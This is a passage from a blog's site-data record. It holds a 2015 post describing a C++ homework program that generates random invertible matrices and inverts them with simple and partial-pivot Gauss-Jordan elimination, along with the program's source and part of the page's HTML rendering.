else tmp[i][j] = (j - size == i);//if it is not the original matrix, add 1s and 0s to the i matrix\n        }\n    }\n    for(int k = 0;k < size;++ k){\n        if(type) getMax(tmp,k,size);//if it is pivot one, just get the max line and swap it to the first line\n        while(tmp[k][k] == 0 && k < size - 1) swap(tmp,k,k + 1,size), ++k;//try to get the no-zero line \n        if(!tmp[k][k]){// this maxtrix is not invertable\n            printf(\"This Matrix can\\'t be inverted\\n\");\n            exit(0);\n        }\n        for(i = k + 1;i < size;++ i){\n            if((div = tmp[i][k] / tmp[k][k]) == 0) continue;\n            for(int j = k;j < size + size;++ j){\n                tmp[i][j] -= div * tmp[k][j];// solve this line\n            }\n        }\n    }\n    for(int k = size - 1;k >= 0;-- k){\n        for(i = k;i >= 0;-- i){\n            if(!tmp[k][k]){\n                printf(\"This Matrix can\\'t be inverted\\n\");\n                exit(0);\n            }\n            if((div = tmp[i][k] / tmp[k][k]) == 0) continue;\n            for(int j = size + size - 1;j >= 0;-- j){\n                if(i == k) tmp[i][j] /= tmp[k][k];\n                else tmp[i][j] -= div * tmp[k][j]; \n            }\n        }\n        output(tmp,size);\n    }\n    return tmp;\n}\n\n/**\n * this function is used to do simple inversion\n *\n * @param matrix: the matrix that needed to be inverted\n *        size: the size of matrix\n * @return the matrix that has been inverted\n **/\ndouble ** simpleMatrixInversion( double ** matrix ,int size){\n    int i = 0;\n\n    //insert your code here.//\n    double ** tmp = runTmp(matrix, 0,size);\n    //declare and allocate the result\n    double ** result = new double*[size];\n    for(i = 0; i<size; i++){\n        result[i] = new double[size];\n        for(int j = 0;j < size;++ j){\n            result[i][j] = tmp[i][j + size];\n        }\n    }\n\treturn result;\n}\n\n\n\n\n\n/**\n * this function is used to do pivot inversion\n *\n * @param matrix: the matrix that needed to be inverted\n *        size: the size of matrix\n * @return the matrix that has been inverted\n **/\n\ndouble ** partialPivotInversion( double ** matrix,int size ){\n\tint i = 0;\n\n\t//insert your code here.//\n    double ** tmp = runTmp(matrix,1,size);\n\n\t//declare and allocate the result\n    double ** result = new double*[size];\n    for(i = 0; i<size; i++){\n        result[i] = new double[size];\n        for(int j = 0;j < size;++ j){\n            result[i][j] = tmp[i][j + size];\n        }\n    }\n\t\n\treturn result;\n}\n\n\n/**\n * this function is used to plus one line to another line\n * this function is used in generate step\n *\n * @param m:the matrix that needed to be changed\n *        size: the size of maxtrix\n * @return NULL\n **/\nvoid linePlus(double ** m, int size){\n    double times = getRandDouble();\n    int line1 = rand() % size, line2 = rand() % size;\n    for(int i = 0;i < size;++ i){\n        m[line1][i] += m[line2][i] * times;\n    }\n}\n\n\n/**\n * this function is used to generate matrix\n * @param size: the size of matrix that needed to be generated\n * @return the generated matrix\n **/\ndouble ** generateMatrix(int size){\n    srand((unsigned)time(NULL));\n    double ** m = new double *[size];\n    for(int i = 0;i < size;++ i) m[i] = new double[size];\n    for(int i = 0;i < size;++ i){\n        m[i][i] = getRandDouble();//get the initiate matrix, whose main line are random doubles and others are 0s.\n    }\n    int times = size * 8; //we need to modify this matrix \"times\" times. we set times = size * 8\n    printf(\"Time = %d\\n\",times);\n    for(int i = 0;i < times;++ i){\n        linePlus(m, size);//add a random line to another random line\n    }\n    ofstream out(\"./debug/generate\");//output the matrix to a file\n    for(int i = 0;i < size;++ i){\n        for(int j = 0;j < size;++ j){\n            out << m[i][j] << ' ';\n        }\n        out << endl;\n    }\n    printf(\"Matrix has been stored to ./debug/generate\\n\");\n    return m;\n}\n\n/**\n * this function is used to compare two matrix\n * @param two matrix and their size\n * @return if they are same\n * tip: this eps is defined in StdAfx.h \n **/\nbool compare(double ** m1, double ** m2,int size){\n    for(int i = 0;i < size;++ i){\n        for(int j = 0;j < size;++ j){\n            if(fabs(m1[i][j] - m2[i][j]) > eps) return false;\n        }\n    }\n    return true;\n}\n\n\n\n\n\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n\n// ###     ###     ###    ####### ###     ###    ###     ### ####### ####### ###   ###   ######   ######  \n// ####   ####    #####   ####### ####    ###    ####   #### ####### ####### ###   ###  ########  ####### \n// ##### #####    #####     ###   #####   ###    ##### ##### ###       ###   ###   ### ########## ########\n// ###########   ### ###    ###   ######  ###    ########### #######   ###   ######### ####  #### ###  ###\n// ### ### ###   ### ###    ###   ### ### ###    ### ### ### #######   ###   ######### ###    ### ###  ###\n// ###  #  ###  ###   ###   ###   ###  ######    ###  #  ### ###       ###   ######### ####  #### ###  ###\n// ###     ###  #########   ###   ###   #####    ###     ### ###       ###   ###   ### ########## ########\n// ###     ###  ######### ####### ###    ####    ###     ### #######   ###   ###   ###  ########  ######## \n// ###     ###  ###   ### ####### ###     ###    ###     ### #######   ###   ###   ###   ######   ######  \n\n//execution format : [executable name] [argument]\nint main(int argc, char* argv[])\n{\n    int size;\n\t///usage handling\n\tif( argc == 1 ){\n\t\tdefaultOutput();\n\t}\n\n\t///file format handling\n\tif( argc == 2 && ( strcmp(argv[1], \"-format\")==0 ) ){\n\t\tfileFormat();\n\t}\n\n\t///invert\n\tif( argc == 2 && ( strcmp(argv[1], \"-format\")!=0 ) ){\n\t\tdouble ** matrix = parseMatrixFile( argv[1], &size );\n\n        if(strcmp(argv[1],\"-g\") == 0) {\n            matrix = generateMatrix(3);\n            printf(\"Generate matrix with order 3\\n\");\n        }\n\t\t\n\t\t//compute the simple inverse and print it\n\t\tdouble ** simpleInverse = simpleMatrixInversion( matrix,size);\n        printf(\"The simple inverse result is:\\n\");\n\t\tprintMatrix(simpleInverse,size);\n\t\t\n\t\t//compute the inverse with partial pivoting and print it\n\t\tdouble ** partialInverse = partialPivotInversion( matrix,size);\n        printf(\"The pivot inverse result is:\\n\");\n\t\tprintMatrix(partialInverse,size);\n        if(compare(simpleInverse,partialInverse,size)) printf(\"Same\\n\");\n        else printf(\"Different\\n\");\n\t\t\n\t\t//clean up\n\t\tfor(int i = 0; i<size; i++){\n\t\t\tdelete[](simpleInverse[i]);\n\t\t\tdelete[](partialInverse[i]);\n\t\t\tdelete[](matrix[i]);\n\t\t}\n\t\tdelete[](simpleInverse);\n\t\tdelete[](partialInverse);\n\t\tdelete[](matrix);\n\t\t\n\t}\n    if(argc == 3 && (strcmp(argv[1], \"-g\") == 0)){\n        size = atoi(argv[2]);\n        if(size < 2){\n            printf(\"The size of matrix must bigger than 1\\n\");\n            exit(0);\n        }\n        double ** matrix = generateMatrix(size);\n        printf(\"Matrix size %dx%d generated\\n\",size,size);\n        printMatrix(matrix,size);\n    }\n\n\n\treturn 0;\n}\n\n\n\n////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n\n\n```\n","source":"_posts/Matrixinvert.md","raw":"title: \"Matrix invert\"\ndate: 2015-10-07 20:25:18\ntags: ADV Programming\n---\nAuthor: Song Li\n[Download Project](/download/Matrix-invert.zip)\n##AIM##\nThis program is used to generate, invert matrix. Just use row addups and swaps rows randomly to generate a invertable matrix.\n<!--more-->\n##USAGE##\n- Invert Matrix: To use the invert function, users need to input the Maxtric File right after the program. Here is an example: $$./debug/invert~./debug/input$$\n- Generate Matrix: To use the generate function, users need to input $-g$ after the program and the size of matrix after the $-g$. Here is an example:\n$$./debug/invert~-g~3$$\nThis command will generate a $3*3$ matrix, and this maxtrix will be output to the terminal and stored in the $./debug/generate$ file at the same time.\n##COMPILE##\nJust use $make$ in the root dir of this program to compile this program. I didn't modify the $Makefile$\n##FILE STRUCTURE##\n- Makefile\n- README.pdf\n- debug/: contains the runable program and generated matrix\n- matrix1-sol315.txt\n- matrix2-sol315.txt\n- object/\n- pivoting-sol315.txt\n- source/main.cpp: main code of this program\n- source/StdAfx.cpp: useless\n- source/StdAfx.h: head file \n- source/parseMatrix.cpp: this code is used to input and output the matrix\n- source/parseMatrix.h: head file of paraseMatrix.cpp\n##RESULT##\nMost of the result will be output directely in the terminal. The generated matrix will be output in both terminal and $/debug/generate$ file.\n##DESIGN##\nIn this part, I mainly talk about how I generate a matrix which is invertable. \nFirstly, I generate a matrix which is random double numbers in the diagonal line, and other numbers are all 0. Like this:\n$$\n\\begin{bmatrix}\n1.231 & 0.000 & 0.000 & 0.000 \\\\\\\\\n0.000 & 1.002 & 0.000 & 0.000 \\\\\\\\\n0.000 & 0.000 & 1923.412 & 0.000 \\\\\\\\\n0.000 & 0.000 & 0.000 & 0.023 \\\\\\\\\n\\end{bmatrix}\n$$\n\nAfter that, I randomly pick a line, use a random double number times every number of this line, and add it to another random line.If I pick line 2 and number 2, and add this line to the 4th line. The result will be like\n$$\n\\begin{bmatrix}\n1.231&0.000&0.000&0.000 \\\\\\\\\n0.000&1.002&0.000&0.000 \\\\\\\\\n0.000&0.000&1923.412&0.000 \\\\\\\\\n0.000&2.004&0.000&0.023 \\\\\\\\\n\\end{bmatrix}\n$$\nSome times later, we can get a random matrix. Generately speaking, we can get every matrix in this way.\n\nMain function code is here. The whole project can be downloaded from the link at the begining of this blog.\n\n```\n\n////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n//Implementation for the Main method\n////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n\n#include \"StdAfx.h\"\n\n\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n\ninline double getRandDouble(){\n    return (double)rand() / (double)rand() * (double)((rand() & 1 << 1) - 1);\n}\nvoid defaultOutput()\n{\n\t\tprintf(\"\\n\");\n\t\tprintf(\"#########################################################\\n\");\n\t\tprintf(\"## 411 Homework: Numerical Analysis                    ##\\n\");\n\t\tprintf(\"## Brian Chen, Oct 20, 2012                            ##\\n\");\n\t\tprintf(\"#########################################################\\n\");\n\t\tprintf(\"\\n\");\n\t\tprintf(\"Usage:\\n\");\n\t\tprintf(\"\\n\");\n\t\tprintf(\"invert \\n\");\n\t\tprintf(\"With no arguments, invert returns this usage statement.\\n\");\n\t\tprintf(\"\\n\");\n\t\tprintf(\"invert <filename>\\n\");\n\t\tprintf(\"Prints out two matrix inverses for the provided matrix.\\n\");\n\t\tprintf(\" -- the first inverse is computed with simple inversion.\\n\");\n\t\tprintf(\" -- the second is computed with partial pivoting\\n\");\n\t\tprintf(\"\\n\");\n\t\tprintf(\"invert -format\\n\");\n\t\tprintf(\"Describes the file format for the input file.\\n\");\n\t\tprintf(\"\\n\");\n\t\tprintf(\"#########################################################\\n\");\n\t\tprintf(\"\\n\");\n\t\texit(0);\n}\n\nvoid fileFormat()\n{\n\t\tprintf(\"\\n\");\n\t\tprintf(\"#########################################################\\n\");\n\t\tprintf(\"## 411 Homework: Numerical Analysis                    ##\\n\");\n\t\tprintf(\"## Brian Chen, Oct 20, 2012                            ##\\n\");\n\t\tprintf(\"#########################################################\\n\");\n\t\tprintf(\"\\n\");\n\t\tprintf(\"File format for a 3rd order matrix (input):\\n\");\n\t\tprintf(\" - numbers below are space deliminated.  no tabs.\\n\");\n\t\tprintf(\" - There are three lines, each with 3 numbers.\\n\");\n\t\tprintf(\" - They will be parsed as doubles.\\n\");\n\t\tprintf(\" - Comment lines start with #.  Comment lines cannot.\\n\");\n\t\tprintf(\"   interrupt the 3 lines with the matrix, but can come.\\n\");\n\t\tprintf(\"   before or after.\\n\");\n\t\tprintf(\"\\n\");\n\t\tprintf(\"---- Matrix file below, not including this line ----\\n\");\n\t\tprintf(\"# comment\\n\");\n\t\tprintf(\"# comment\\n\");\n\t\tprintf(\"1.2 3.3 4.4\\n\");\n\t\tprintf(\"1.112 2.24 0\\n\");\n\t\tprintf(\"3.4 2.2 98.23452\\n\");\n\t\tprintf(\"#\\n\");\n\t\tprintf(\"#\\n\");\n\t\tprintf(\"---- Matrix file above, not including this line ----\\n\");\n\t\tprintf(\"\\n\");\n\t\tprintf(\"#########################################################\\n\");\n\t\tprintf(\"\\n\");\n\t\texit(0);\n}\n\n\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n\n//Inside the result, the result is to be stored as:\n//i=0 i=1 i=2\n//[0] [3] [6]  //j=0\n//[1] [4] [7]  //j=1\n//[2] [5] [8]  //j=2\n//\n//where the above 3x3 matrix is as you would write it on paper.\n//\n\n\n/**\n * this function is mainly used for debug. we can use it to output\n *\n * @param m: the matrix that needed to be output\n *        size: the size of matrix\n * @return NULL\n **/\nvoid output(double  ** m,int size){\n    if(DEBUG == 0) return ;//Debug is defined in StdAfx.h \n    for(int i = 0;i < size;++ i){\n        for(int j = 0;j < size + size;++ j){\n            if(j == size) printf(\"|\\t\");\n            printf(\"%f\\t\",m[i][j]);\n        }\n        printf(\"\\n\");\n    }\n    printf(\"\\n\");\n\n}\n\n/**\n * this function is mainly used to swap two lines in a matrix\n *\n * @param matrix: the matrix that needed to be swaped\n *        a: the first line which should be swaped\n *        b: the second line which should be swaped\n *        size: the size of the matrix\n * @return NULL\n **/\n\nvoid swap(double ** matrix,int a,int b,int size){\n    output(matrix,size);\n    double tmp[1000];\n    memcpy(tmp,matrix[a],size * 2 * sizeof(double));\n    memcpy(matrix[a],matrix[b], size * 2 * sizeof(double));\n    memcpy(matrix[b],tmp,size * 2 * sizeof(double));\n    output(matrix,size);\n    return ;\n}\n\n\n/**\n * this function is used to get the Max line of the matrix and swap it to the first line\n *\n * @param tmp: the matrix\n *        k: the col that we should find the max line\n *        size: the size of matrix\n * @return NULL\n **/\nvoid getMax(double ** tmp, int k,int size){\n    int Max = k;\n    for(int i = k + 1;i < size;++ i){\n        if(fabs(tmp[i][k]) > fabs(tmp[Max][k])) Max = i; //get the max line\n    }\n    if(Max != k) {\n        swap(tmp,Max,k,size);\n    }\n    return ;\n}\n\n/**\n * this function is used to do the most important things, invert the matrix\n *\n * @param matrix: the matrix that needed to be inverted\n *        type: it is the simple one or pivot one\n *              1: pivot 2:simple\n *        size: the size of matrix;\n **/ \ndouble ** runTmp(double ** matrix, bool type,int size){\n\tint i = 0;\n    double div;\n\n    double ** tmp = new double*[size];\n\n    for(i = 0;i < size;i ++){\n        tmp[i] = new double[size + size];\n    }\n\n\n    for(i = 0;i < size;++ i){//read matrix into tmp matrix and add i after matrix\n        for(int j = 0;j < size + size;++ j){\n            if(j < size) tmp[i][j] = matrix[i][j];\n            else tmp[i][j] = (j - size == i);//if it is not the original matrix, add 1s and 0s to the i matrix\n        }\n    }\n    for(int k = 0;k < size;++ k){\n        if(type) getMax(tmp,k,size);//if it is pivot one, just get the max line and swap it to the first line\n        while(tmp[k][k] == 0 && k < size - 1) swap(tmp,k,k + 1,size), ++k;//try to get the no-zero line \n        if(!tmp[k][k]){// this maxtrix is not invertable\n            printf(\"This Matrix can\\'t be inverted\\n\");\n            exit(0);\n        }\n        for(i = k + 1;i < size;++ i){\n            if((div = tmp[i][k] / tmp[k][k]) == 0) continue;\n            for(int j = k;j < size + size;++ j){\n                tmp[i][j] -= div * tmp[k][j];// solve this line\n            }\n        }\n    }\n    for(int k = size - 1;k >= 0;-- k){\n        for(i = k;i >= 0;-- i){\n            if(!tmp[k][k]){\n                printf(\"This Matrix can\\'t be inverted\\n\");\n                exit(0);\n            }\n            if((div = tmp[i][k] / tmp[k][k]) == 0) continue;\n            for(int j = size + size - 1;j >= 0;-- j){\n                if(i == k) tmp[i][j] /= tmp[k][k];\n                else tmp[i][j] -= div * tmp[k][j]; \n            }\n        }\n        output(tmp,size);\n    }\n    return tmp;\n}\n\n/**\n * this function is used to do simple inversion\n *\n * @param matrix: the matrix that needed to be inverted\n *        size: the size of matrix\n * @return the matrix that has been inverted\n **/\ndouble ** simpleMatrixInversion( double ** matrix ,int size){\n    int i = 0;\n\n    //insert your code here.//\n    double ** tmp = runTmp(matrix, 0,size);\n    //declare and allocate the result\n    double ** result = new double*[size];\n    for(i = 0; i<size; i++){\n        result[i] = new double[size];\n        for(int j = 0;j < size;++ j){\n            result[i][j] = tmp[i][j + size];\n        }\n    }\n\treturn result;\n}\n\n\n\n\n\n/**\n * this function is used to do pivot inversion\n *\n * @param matrix: the matrix that needed to be inverted\n *        size: the size of matrix\n * @return the matrix that has been inverted\n **/\n\ndouble ** partialPivotInversion( double ** matrix,int size ){\n\tint i = 0;\n\n\t//insert your code here.//\n    double ** tmp = runTmp(matrix,1,size);\n\n\t//declare and allocate the result\n    double ** result = new double*[size];\n    for(i = 0; i<size; i++){\n        result[i] = new double[size];\n        for(int j = 0;j < size;++ j){\n            result[i][j] = tmp[i][j + size];\n        }\n    }\n\t\n\treturn result;\n}\n\n\n/**\n * this function is used to plus one line to another line\n * this function is used in generate step\n *\n * @param m:the matrix that needed to be changed\n *        size: the size of maxtrix\n * @return NULL\n **/\nvoid linePlus(double ** m, int size){\n    double times = getRandDouble();\n    int line1 = rand() % size, line2 = rand() % size;\n    for(int i = 0;i < size;++ i){\n        m[line1][i] += m[line2][i] * times;\n    }\n}\n\n\n/**\n * this function is used to generate matrix\n * @param size: the size of matrix that needed to be generated\n * @return the generated matrix\n **/\ndouble ** generateMatrix(int size){\n    srand((unsigned)time(NULL));\n    double ** m = new double *[size];\n    for(int i = 0;i < size;++ i) m[i] = new double[size];\n    for(int i = 0;i < size;++ i){\n        m[i][i] = getRandDouble();//get the initiate matrix, whose main line are random doubles and others are 0s.\n    }\n    int times = size * 8; //we need to modify this matrix \"times\" times. we set times = size * 8\n    printf(\"Time = %d\\n\",times);\n    for(int i = 0;i < times;++ i){\n        linePlus(m, size);//add a random line to another random line\n    }\n    ofstream out(\"./debug/generate\");//output the matrix to a file\n    for(int i = 0;i < size;++ i){\n        for(int j = 0;j < size;++ j){\n            out << m[i][j] << ' ';\n        }\n        out << endl;\n    }\n    printf(\"Matrix has been stored to ./debug/generate\\n\");\n    return m;\n}\n\n/**\n * this function is used to compare two matrix\n * @param two matrix and their size\n * @return if they are same\n * tip: this eps is defined in StdAfx.h \n **/\nbool compare(double ** m1, double ** m2,int size){\n    for(int i = 0;i < size;++ i){\n        for(int j = 0;j < size;++ j){\n            if(fabs(m1[i][j] - m2[i][j]) > eps) return false;\n        }\n    }\n    return true;\n}\n\n\n\n\n\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n\n// ###     ###     ###    ####### ###     ###    ###     ### ####### ####### ###   ###   ######   ######  \n// ####   ####    #####   ####### ####    ###    ####   #### ####### ####### ###   ###  ########  ####### \n// ##### #####    #####     ###   #####   ###    ##### ##### ###       ###   ###   ### ########## ########\n// ###########   ### ###    ###   ######  ###    ########### #######   ###   ######### ####  #### ###  ###\n// ### ### ###   ### ###    ###   ### ### ###    ### ### ### #######   ###   ######### ###    ### ###  ###\n// ###  #  ###  ###   ###   ###   ###  ######    ###  #  ### ###       ###   ######### ####  #### ###  ###\n// ###     ###  #########   ###   ###   #####    ###     ### ###       ###   ###   ### ########## ########\n// ###     ###  ######### ####### ###    ####    ###     ### #######   ###   ###   ###  ########  ######## \n// ###     ###  ###   ### ####### ###     ###    ###     ### #######   ###   ###   ###   ######   ######  \n\n//execution format : [executable name] [argument]\nint main(int argc, char* argv[])\n{\n    int size;\n\t///usage handling\n\tif( argc == 1 ){\n\t\tdefaultOutput();\n\t}\n\n\t///file format handling\n\tif( argc == 2 && ( strcmp(argv[1], \"-format\")==0 ) ){\n\t\tfileFormat();\n\t}\n\n\t///invert\n\tif( argc == 2 && ( strcmp(argv[1], \"-format\")!=0 ) ){\n\t\tdouble ** matrix = parseMatrixFile( argv[1], &size );\n\n        if(strcmp(argv[1],\"-g\") == 0) {\n            matrix = generateMatrix(3);\n            printf(\"Generate matrix with order 3\\n\");\n        }\n\t\t\n\t\t//compute the simple inverse and print it\n\t\tdouble ** simpleInverse = simpleMatrixInversion( matrix,size);\n        printf(\"The simple inverse result is:\\n\");\n\t\tprintMatrix(simpleInverse,size);\n\t\t\n\t\t//compute the inverse with partial pivoting and print it\n\t\tdouble ** partialInverse = partialPivotInversion( matrix,size);\n        printf(\"The pivot inverse result is:\\n\");\n\t\tprintMatrix(partialInverse,size);\n        if(compare(simpleInverse,partialInverse,size)) printf(\"Same\\n\");\n        else printf(\"Different\\n\");\n\t\t\n\t\t//clean up\n\t\tfor(int i = 0; i<size; i++){\n\t\t\tdelete[](simpleInverse[i]);\n\t\t\tdelete[](partialInverse[i]);\n\t\t\tdelete[](matrix[i]);\n\t\t}\n\t\tdelete[](simpleInverse);\n\t\tdelete[](partialInverse);\n\t\tdelete[](matrix);\n\t\t\n\t}\n    if(argc == 3 && (strcmp(argv[1], \"-g\") == 0)){\n        size = atoi(argv[2]);\n        if(size < 2){\n            printf(\"The size of matrix must bigger than 1\\n\");\n            exit(0);\n        }\n        double ** matrix = generateMatrix(size);\n        printf(\"Matrix size %dx%d generated\\n\",size,size);\n        printMatrix(matrix,size);\n    }\n\n\n\treturn 0;\n}\n\n\n\n////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n\n\n```\n","slug":"Matrixinvert","published":1,"updated":"2016-06-08T20:21:15.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciph681up000uwypdqzw45jle","content":"<p>Author: Song Li<br><a href=\"/download/Matrix-invert.zip\">Download Project</a></p>\n<p>##AIM##<br>This program is used to generate, invert matrix. Just use row addups and swaps rows randomly to generate a invertable matrix.<br><a id=\"more\"></a></p>\n<p>##USAGE##</p>\n<ul>\n<li>Invert Matrix: To use the invert function, users need to input the Maxtric File right after the program. Here is an example: $$./debug/invert~./debug/input$$</li>\n<li>Generate Matrix: To use the generate function, users need to input $-g$ after the program and the size of matrix after the $-g$. Here is an example:<br>$$./debug/invert~-g~3$$<br>This command will generate a $3*3$ matrix, and this maxtrix will be output to the terminal and stored in the $./debug/generate$ file at the same time.<br>##COMPILE##<br>Just use $make$ in the root dir of this program to compile this program. I didn’t modify the $Makefile$<br>##FILE STRUCTURE##</li>\n<li>Makefile</li>\n<li>README.pdf</li>\n<li>debug/: contains the runable program and generated matrix</li>\n<li>matrix1-sol315.txt</li>\n<li>matrix2-sol315.txt</li>\n<li>object/</li>\n<li>pivoting-sol315.txt</li>\n<li>source/main.cpp: main code of this program</li>\n<li>source/StdAfx.cpp: useless</li>\n<li>source/StdAfx.h: head file </li>\n<li>source/parseMatrix.cpp: this code is used to input and output the matrix</li>\n<li>source/parseMatrix.h: head file of paraseMatrix.cpp<br>##RESULT##<br>Most of the result will be output directely in the terminal. The generated matrix will be output in both terminal and $/debug/generate$ file.<br>##DESIGN##<br>In this part, I mainly talk about how I generate a matrix which is invertable.<br>Firstly, I generate a matrix which is random double numbers in the diagonal line, and other numbers are all 0. Like this:<br>$$<br>\\begin{bmatrix}<br>1.231 &amp; 0.000 &amp; 0.000 &amp; 0.000 \\\\<br>0.000 &amp; 1.002 &amp; 0.000 &amp; 0.000 \\\\<br>0.000 &amp; 0.000 &amp; 1923.412 &amp; 0.000 \\\\<br>0.000 &amp; 0.000 &amp; 0.000 &amp; 0.023 \\\\<br>\\end{bmatrix}<br>$$</li>\n</ul>\n<p>After that, I randomly pick a line, use a random double number times every number of this line, and add it to another random line.If I pick line 2 and number 2, and add this line to the 4th line. The result will be like<br>$$<br>\\begin{bmatrix}<br>1.231&amp;0.000&amp;0.000&amp;0.000 \\\\<br>0.000&amp;1.002&amp;0.000&amp;0.000 \\\\<br>0.000&amp;0.000&amp;1923.412&amp;0.000 \\\\<br>0.000&amp;2.004&amp;0.000&amp;0.023 \\\\<br>\\end{bmatrix}<br>$$<br>Some times later, we can get a random matrix. Generately speaking, we can get every matrix in this way.</p>\n<p>Main function code is here. The whole project can be downloaded from the link at the begining of this blog.</p>\n<figure class=\"highlight livescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span 